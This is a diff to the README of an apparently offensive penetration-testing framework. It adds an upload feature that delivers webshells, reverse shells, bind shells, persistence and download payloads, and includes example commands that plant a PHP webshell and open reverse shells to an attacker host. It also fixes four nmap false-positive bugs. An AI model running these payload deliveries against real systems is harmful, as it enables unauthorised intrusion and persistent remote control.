@@ -2,12 +2,13 @@
 
 > Multi-protocol penetration testing framework for IoT and VoIP environments.
 
-![Version](https://img.shields.io/badge/version-3.5.0-blue)
+![Version](https://img.shields.io/badge/version-3.6.0-blue)
 ![Platform](https://img.shields.io/badge/platform-Kali%20Linux-purple)
 ![License](https://img.shields.io/badge/license-MIT-green)
 ![Shell](https://img.shields.io/badge/shell-bash-yellow)
-![Subcommands](https://img.shields.io/badge/subcommands-51-orange)
+![Subcommands](https://img.shields.io/badge/subcommands-52-orange)
 ![Scripts](https://img.shields.io/badge/scripts-14-red)
+![UploadTypes](https://img.shields.io/badge/upload--types-45-lightblue)
 
 ---
 
@@ -15,9 +16,11 @@
 
 **exa-dune** is a comprehensive bash-based penetration testing framework specialised for IoT devices, VoIP gateways, IP cameras, and industrial control systems. It wraps and orchestrates dozens of tools available on Kali Linux, adds custom Python/JS/Shell attack scripts, generates professional CVSS 3.1 PDF reports in Italian, and maintains a full SQLite assessment history.
 
+> **v3.6.0** adds the `upload` subcommand (45 payload types, 19 categories, 6 protocols) and fixes 4 false positive bugs in the VNC, RDP, DNS and Nuclei modules.
+
 ```
 ╔══════════════════════════════════════════════╗
-║    EXA-DUNE v3.5.0                           ║
+║    EXA-DUNE v3.6.0                           ║
 ║    Generic Network Assessment Tool           ║
 ╚══════════════════════════════════════════════╝
 ```
@@ -28,7 +31,7 @@
 
 | Feature | Details |
 |---|---|
-| **51 subcommands** | Full coverage from recon to post-exploitation |
+| **52 subcommands** | Full coverage from recon to post-exploitation |
 | **14 auxiliary scripts** | Custom Python, Node.js and Shell tools in `scripts/` |
 | **Credential propagation** | Auto cross-service testing of found credentials |
 | **Smart pipeline** | scan → fingerprint → attack → post-exploit → PDF report |
@@ -145,11 +148,12 @@ apt install nodejs && npm install -g ws
 | `firmware` | Firmware analysis: binwalk, hardcoded creds, SUID, TLS certs |
 | `config-audit` | Config file audit: creds, SNMP, hash types, private keys |
 
-### Post-Exploitation
+### Post-Exploitation & Payload Delivery
 | Command | Description |
 |---|---|
 | `post` | Post-exploitation (shell, web, smb, revshell, privesc, PTH) |
 | `fw` | Firewall bypass + analysis (ACK/FIN/frag/IPv6/UPnP/SIP-ALG) |
+| `upload` | Upload scripts/payloads to open ports (HTTP/FTP/TFTP/SMB/SSH/TCP) with 45 built-in types |
 
 ### Orchestration
 | Command | Description |
@@ -219,6 +223,65 @@ Installed to `/usr/share/exa-dune/scripts/` via `exa-dune install`.
 |---|---|
 | `voip_capture.sh` | VoIP traffic capture (tcpdump SIP+RTP) + analysis + cred extract |
 | `net_recon.sh` | Quick recon: arp-scan + nmap top-50 + device fingerprint |
+
+---
+
+## Upload Subcommand
+
+`exa-dune upload` delivers scripts and payloads to a target through the most appropriate protocol, auto-detected from the open ports found during scanning.
+
+### Protocols
+
+| Protocol | Ports (auto-detect) | Method |
+|---|---|---|
+| HTTP | 80, 8080, 8000, 8888 | PUT / POST multipart |
+| HTTPS | 443, 8443 | PUT / POST (with `-k`) |
+| FTP | 21 | `curl -T` (anonymous + credential fallback) |
+| TFTP | 69 | `atftp --put` |
+| SMB | 445 | `smbclient -c "put"` |
+| SSH/SCP | 22 | `scp` with known credentials |
+| TCP raw | any | `nc` pipe |
+
+### Script Catalog (`--type`)
+
+45 built-in payload types across 19 categories. All external sources are verified open-source (MIT, GPL v2, public domain).
+
+```bash
+exa-dune upload --list-types                              # full catalog
+exa-dune upload <TARGET> --show-type php-monkey           # preview source
+exa-dune upload <TARGET> --type php-cmd --port 80         # upload webshell
+exa-dune upload <TARGET> --type py-revshell \
+    --lhost 192.168.1.100 --lport 4444                    # reverse shell
+exa-dune upload <TARGET> --type nodejs-revshell \
+    --lhost 192.168.1.100 --dry-run                       # dry run
+```
+
+| Category | Types |
+|---|---|
+| PHP | `php-cmd`, `php-info`, `php-revshell`, `php-upload`, `php-monkey` (pentestmonkey GPL v2), `php-bindshell` |
+| JSP | `jsp-cmd`, `jsp-revshell`, `jsp-kit` (tennc/webshell) |
+| ASP/ASPX | `asp-cmd`, `aspx-cmd`, `aspx-laudanum` (Laudanum GPL v2) |
+| Python | `py-revshell`, `py-bindshell`, `py-recon`, `py-download`, `py-pty` |
+| Bash | `sh-revshell`, `sh-recon`, `sh-persistence`, `sh-bindshell` |
+| Perl | `pl-revshell`, `pl-monkey` (pentestmonkey GPL v2) |
+| Ruby | `rb-revshell`, `rb-cmd` |
+| PowerShell | `ps1-revshell`, `ps1-recon`, `ps1-bindshell`, `ps1-download` |
+| Java | `war-stub`, `java-tcp` |
+| Node.js | `nodejs-revshell` |
+| Golang | `go-revshell` |
+| Groovy | `groovy-revshell` |
+| Lua | `lua-revshell` |
+| Awk | `awk-revshell` |
+| OpenSSL | `openssl-revshell` (TLS-encrypted shell) |
+| Socat | `socat-shell` (full PTY) |
+| Rust | `rust-revshell` |
+| C | `c-revshell` (compile + run) |
+| Netcat | `nc-revshell`, `nc-openbsd`, `nc-busybox` |
+| Telnet | `telnet-revshell` (two-listener) |
+| Dart | `dart-revshell` |
+| ColdFusion | `cfm-cmd` (Laudanum GPL v2, X-Auth-Code protected) |
+
+> **Sources verified:** [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (MIT), [pentestmonkey](https://github.com/pentestmonkey) (GPL v2), [Laudanum](https://github.com/jbarcia/Web-Shells) (GPL v2), [tennc/webshell](https://github.com/tennc/webshell) (public).
 
 ---
 
@@ -325,7 +388,7 @@ exa-dune self-test --install-missing
 
 ```
 exa-dune-repo/
-├── exa-dune                    # Main script (~18.600 lines)
+├── exa-dune                    # Main script (~21.000 lines)
 ├── scripts/
 │   ├── python/                 # 10 Python attack scripts
 │   ├── js/                     # 2 Node.js scripts
@@ -339,6 +402,59 @@ Output is saved to `/root/pentest/exa-dune-<target>_<timestamp>/` with subdirect
 ---
 
 ## Changelog
+
+### v3.6.0 — 2026-04-05
+
+#### New: `upload` subcommand
+
+Full payload delivery system: generate, stage and upload scripts/shells to a target through the protocol that fits the open ports found.
+
+| Feature | Details |
+|---|---|
+| **Protocol auto-detect** | Maps open ports → HTTP / HTTPS / FTP / TFTP / SMB / SSH / TCP raw |
+| **45 payload types** | Built-in catalog across 19 categories (`--list-types`) |
+| **Source preview** | `--show-type <type>` prints the full script before uploading |
+| **Placeholder substitution** | `--lhost` / `--lport` replace `LHOST`/`LPORT` in all templates |
+| **Upload verification** | HTTP: GET after PUT to confirm file is reachable |
+| **Session log** | `upload_session.txt` with proto/port/MD5 per run |
+| **Dry-run support** | `--dry-run` shows curl/scp/nc command without executing |
+| **External sources** | Verified open-source: pentestmonkey (GPL v2), Laudanum (GPL v2), InternalAllTheThings (MIT), tennc/webshell |
+
+**New payload types in v3.6.0** (added on top of v3.5.x catalog):
+
+| Type | Category | Source | License |
+|---|---|---|---|
+| `rust-revshell` | Rust | InternalAllTheThings | MIT |
+| `c-revshell` | C | InternalAllTheThings | MIT |
+| `nc-revshell` | Netcat | InternalAllTheThings | MIT |
+| `nc-openbsd` | Netcat | InternalAllTheThings | MIT |
+| `nc-busybox` | Netcat | InternalAllTheThings | MIT |
+| `telnet-revshell` | Telnet | InternalAllTheThings | MIT |
+| `sh-bindshell` | Bash | original | — |
+| `ps1-bindshell` | PowerShell | InternalAllTheThings | MIT |
+| `ps1-download` | PowerShell | InternalAllTheThings | MIT |
+| `rb-cmd` | Ruby | InternalAllTheThings | MIT |
+| `dart-revshell` | Dart | InternalAllTheThings | MIT |
+| `cfm-cmd` | ColdFusion | Laudanum Project | GPL v2 |
+
+**Previous upload types** (added in v3.5.x):
+
+`java-tcp`, `php-monkey`, `jsp-kit`, `aspx-laudanum`, `pl-monkey`, `nodejs-revshell`, `go-revshell`, `groovy-revshell`, `lua-revshell`, `awk-revshell`, `openssl-revshell`, `socat-shell`, `py-pty`
+
+---
+
+#### Bug fixes
+
+| # | Module | Severity | Bug | Fix |
+|---|---|---|---|---|
+| 1 | `web` (Nuclei) | Logic error | `[critical]` findings from Nuclei were reported as `found HIGH` instead of `found CRITICAL`; `[low]` findings were silently dropped | Split into 4 separate greps: each severity level maps to its correct `found` level (`CRITICAL/HIGH/MEDIUM/LOW`) |
+| 2 | `dns` | False positive HIGH | `grep -iE "dns-zone-transfer"` matched the nmap header comment line `# Nmap 7.98 scan … --script dns-zone-transfer.domain=…` → spurious `[FOUND:HIGH] DNS — # Nmap 7.98 scan initiated…` on every DNS scan | Added `grep -v "^#"` filter before the `while` loop |
+| 3 | `rdp` | False positive CRITICAL | `grep -i "MS12-020"` matched the nmap header comment `# Nmap … --script rdp-vuln-ms12-020 …` → `[FOUND:CRITICAL] RDP — VULNERABILE MS12-020` on every host with port 3389 open | Replaced bare `grep && found` with `grep \| grep -v "^#" \| grep -q . && found` |
+| 4 | `vnc` | False positive CRITICAL | `grep -i "bypass"` matched `realvnc-auth-bypass` in the nmap script name in the header comment → `[FOUND:CRITICAL] VNC — autenticazione ASSENTE` on any open VNC port | Same fix as RDP: `\| grep -v "^#" \| grep -q .` |
+
+> **Pattern:** bugs 2-4 share the same root cause — nmap `-oN` output includes a `# Nmap X.Y scan initiated … as: nmap … --script <script-name> …` comment on line 1. Any `grep` that matches a keyword also present in a script name (e.g. `dns-zone-transfer`, `rdp-vuln-ms12-020`, `realvnc-auth-bypass`) would fire on every scan regardless of actual vulnerability. Fix pattern: always pipe through `grep -v "^#"` before evaluating nmap `.txt` output.
+
+---
 
 ### v3.5.0 — 2026-03-29
 
